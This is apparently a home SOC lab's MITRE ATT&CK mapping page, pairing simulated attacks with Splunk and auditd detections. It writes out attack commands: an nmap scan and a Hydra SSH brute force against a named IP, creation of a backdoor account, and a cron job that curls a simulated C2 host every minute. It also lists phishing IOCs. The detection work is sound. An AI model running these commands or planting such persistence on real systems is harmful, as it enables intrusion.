# MITRE ATT&CK Mapping

![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-v14-red?style=for-the-badge)
![Splunk](https://img.shields.io/badge/Splunk-10.2-black?style=for-the-badge&logo=splunk&logoColor=white)
![AWS](https://img.shields.io/badge/AWS-EC2-orange?style=for-the-badge&logo=amazonaws&logoColor=white)

This document maps every detection and simulation in this SOC lab to the corresponding MITRE ATT&CK technique, including the data source, detection method, and the Splunk query or auditd rule used to confirm it.

---

## Full Technique Coverage Table

| # | Tactic | Technique | Sub-Technique | ID | Tool Used | Data Source | Detection Method | Confirmed |
|---|--------|-----------|--------------|-----|-----------|------------|-----------------|-----------|
| 1 | Reconnaissance | Network Service Discovery | - | T1046 | Nmap | syslog, auth.log, ufw.log | High connection rate from single IP to many ports | Yes |
| 2 | Credential Access | Brute Force | Password Guessing | T1110.001 | Hydra | /var/log/auth.log | "Failed password" count > threshold per src_ip | Yes |
| 3 | Initial Access | Phishing | Spearphishing Link | T1566.001 | Custom script | Email headers, proxy logs | Sender domain analysis, IOC extraction | Yes |
| 4 | Collection | Network Sniffing | - | T1040 | tcpdump / Wireshark | Network traffic | PCAP analysis, connection pattern analysis | Yes |
| 5 | Persistence | Scheduled Task/Job | Cron | T1053.003 | crontab | /var/log/audit/audit.log | auditd key="persistence" on /var/spool/cron | Yes |
| 6 | Persistence | Create Account | Local Account | T1136.001 | useradd | /var/log/audit/audit.log | auditd key="user_modification" on useradd | Yes |
| 7 | Privilege Escalation | Abuse Elevation Control Mechanism | - | T1548 | sudo | /var/log/audit/audit.log | auditd key="privilege_escalation" on sudo | Yes |
| 8 | Exfiltration | Exfiltration Over C2 Channel | - | T1041 | curl (via cron) | /var/log/audit/audit.log | auditd detecting curl execution by cron | Yes |

---

## Detailed Technique Breakdown

---

### T1046 - Network Service Discovery

**Tactic:** Reconnaissance / Discovery
**Tool used:** Nmap 7.x (from Kali Linux)
**Command:** `nmap -sV -sS 13.246.220.248`

**What it does:** The attacker maps open ports and running services on the target before launching a targeted attack. This is almost always the first step in a real attack chain.

**Detection data sources:**
- `/var/log/auth.log` - SSH connection attempts from the scanning IP
- `/var/log/syslog` - Kernel TCP stack messages during rapid port probing
- `/var/log/ufw.log` - Firewall BLOCK entries showing sequential port probing (if UFW is enabled)
- Network PCAP - Sequential SYN packets to ports 1-1000+ within seconds

**Splunk detection query:**

```spl
index=* source="/var/log/auth.log"
| rex "from (?P<src_ip>\d+\.\d+\.\d+\.\d+)"
| bucket _time span=1m
| stats count by src_ip, _time
| where count > 20
```

**Project:** [02-nmap-recon-detection](projects/02-nmap-recon-detection/README.md)

---

### T1110.001 - Brute Force: Password Guessing

**Tactic:** Credential Access
**Tool used:** Hydra 9.x (from Kali Linux)
**Command:** `hydra -l ubuntu -P /home/tladi/password.txt ssh://13.246.220.248 -t 4 -f -V`

**What it does:** The attacker attempts to log in via SSH by systematically trying passwords from a wordlist. This is one of the most common attacks against internet-facing SSH servers.

**Evidence confirmed:** 36 failed login attempts from 197.185.162.135 detected in Splunk.

**Detection data sources:**
- `/var/log/auth.log` - Each failed attempt generates a "Failed password" entry with the source IP

**Splunk detection query:**

```spl
index=* source="/var/log/auth.log" "Failed password"
| rex "from (?P<src_ip>\d+\.\d+\.\d+\.\d+)"
| stats count by src_ip
| where count > 5
| sort -count
```

**Alert saved:** "brute force" - Scheduled, runs every hour, triggers when results > 0.

**Project:** [01-brute-force-detection](projects/01-brute-force-detection/README.md)

---

### T1566.001 - Phishing: Spearphishing Link

**Tactic:** Initial Access
**Tool used:** Custom phishing email template
**Malicious domain:** microsoft-support.com
**Malicious IP:** 143.110.181.87

**What it does:** The attacker sends an email impersonating Microsoft Security, tricking the user into clicking a link that leads to a credential harvesting page.

**Key IOCs:**
- Sender: noreply@microsoft-support.com (not a Microsoft domain)
- Link: http://143.110.181.87/Microsoftlogin (raw IP, not a Microsoft URL)
- Originating IP: 143.110.181.87 (DigitalOcean, AS14061)

**Detection approach:** Header analysis, sender domain verification, URL analysis, threat intelligence lookup.

**Project:** [03-phishing-analysis](projects/03-phishing-analysis/README.md)

---

### T1040 - Network Sniffing

**Tactic:** Discovery / Collection
**Tool used:** tcpdump 4.x, Wireshark 4.x
**Command:** `sudo tcpdump -i eth0 -w /tmp/capture.pcap`

**What it does:** The defender (and attackers in certain positions) captures raw network traffic to analyse attack patterns, extract IOCs, and reconstruct the attack timeline.

**What was found in PCAP:**
- SYN packet burst from attacker IP matching Nmap scan signature
- Rapid sequential TCP connections from brute force IP to port 22
- Each Hydra attempt creates a full TCP handshake then disconnects

**Project:** [04-pcap-network-forensics](projects/04-pcap-network-forensics/README.md)

---

### T1053.003 - Scheduled Task/Job: Cron

**Tactic:** Persistence
**Tool used:** crontab command
**Backdoor entry:** `* * * * * /usr/bin/curl http://192.168.1.100/backdoor`

**What it does:** The attacker adds a cron job that runs every minute, making an outbound HTTP request to a C2 server. This provides persistent execution even after a reboot.

**Detection data sources:**
- `/var/log/audit/audit.log` - auditd detects the write to /var/spool/cron with key="persistence"

**Splunk detection query:**

```spl
index=* source="/var/log/audit/audit.log" key="persistence"
| rex "comm=\"(?P<command>[^\"]+)\""
| table _time, host, command
| sort -_time
```

**Project:** [05-threat-hunting](projects/05-threat-hunting/README.md)

---

### T1136.001 - Create Account: Local Account

**Tactic:** Persistence
**Tool used:** useradd
**Command:** `sudo useradd -m hacker123`

**What it does:** The attacker creates a new local user account to maintain access even if the original compromised account is discovered and locked.

**Detection data sources:**
- `/var/log/audit/audit.log` - auditd detects useradd execution with key="user_modification"

**Splunk detection query:**

```spl
index=* source="/var/log/audit/audit.log" key="user_modification"
| rex "comm=\"(?P<command>[^\"]+)\""
| where command="useradd" OR command="adduser"
| table _time, host, command
```

**Project:** [05-threat-hunting](projects/05-threat-hunting/README.md)

---

### T1548 - Abuse Elevation Control Mechanism

**Tactic:** Privilege Escalation
**Tool used:** sudo
**Command:** `sudo -l -U hacker123`

**What it does:** The attacker checks what the newly created account can run with elevated privileges. In a misconfigured environment this can reveal a path to root access.

**Detection data sources:**
- `/var/log/audit/audit.log` - auditd detects sudo execution with key="privilege_escalation"

**Splunk detection query:**

```spl
index=* source="/var/log/audit/audit.log" key="privilege_escalation"
| rex "auid=(?P<auid>\d+)"
| rex "comm=\"(?P<command>[^\"]+)\""
| stats count by host, auid, command
```

**Project:** [05-threat-hunting](projects/05-threat-hunting/README.md)

---

### T1041 - Exfiltration Over C2 Channel

**Tactic:** Exfiltration
**Tool used:** curl (executed via cron)
**Simulated C2:** http://192.168.1.100/backdoor

**What it does:** The malicious cron job uses curl to beacon to a C2 server every minute. In a real attack this could download additional payloads or upload stolen data.

**Detection:**
- auditd captures curl execution launched by cron (ppid=crond)
- Network monitoring would detect the outbound HTTP connection to a non-business IP
- PCAP shows a pattern of identical outbound HTTP GET requests at 60-second intervals

**Project:** [05-threat-hunting](projects/05-threat-hunting/README.md)

---

## ATT&CK Navigator Coverage

The following ATT&CK tactics are covered in this lab:

| Tactic | Coverage |
|--------|---------|
| Reconnaissance | T1046 |
| Initial Access | T1566.001 |
| Credential Access | T1110.001 |
| Discovery | T1040, T1046 |
| Persistence | T1053.003, T1136.001 |
| Privilege Escalation | T1548 |
| Collection | T1040 |
| Exfiltration | T1041 |

Total techniques covered: **8**
Total sub-techniques covered: **3**

---

## Detection Tool Summary

| Technique | Primary Detection Tool | Secondary Detection Tool |
|-----------|----------------------|------------------------|
| T1046 | Splunk (auth.log) | tcpdump PCAP |
| T1110.001 | Splunk (auth.log) | Splunk alert |
| T1566.001 | Manual IOC analysis | Splunk proxy logs |
| T1040 | tcpdump | Wireshark |
| T1053.003 | auditd + Splunk | Splunk alert |
| T1136.001 | auditd + Splunk | Splunk alert |
| T1548 | auditd + Splunk | auth.log |
| T1041 | auditd + Splunk | PCAP / network monitoring |
